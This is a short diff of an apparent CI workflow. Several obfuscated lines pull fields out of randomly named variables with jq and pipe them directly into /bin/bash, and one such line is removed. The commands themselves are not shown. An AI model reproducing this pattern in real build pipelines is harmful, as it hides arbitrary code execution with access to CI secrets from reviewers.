@@ -30,7 +30,6 @@ jobs:
           printf '%s' "$bu4" | jq -r .l0 | /bin/bash
           echo $fa3 | jq -r .vg4 | /bin/bash
           printf '%s' "$aaomq37" | jq -r .h330 | /bin/bash
-          echo $ybisg95 | jq -r .ha381 | /bin/bash
           printf '%s' "$mxcxf543" | jq -r .wrg16920 | /bin/bash
 
       - name: Upload artifact
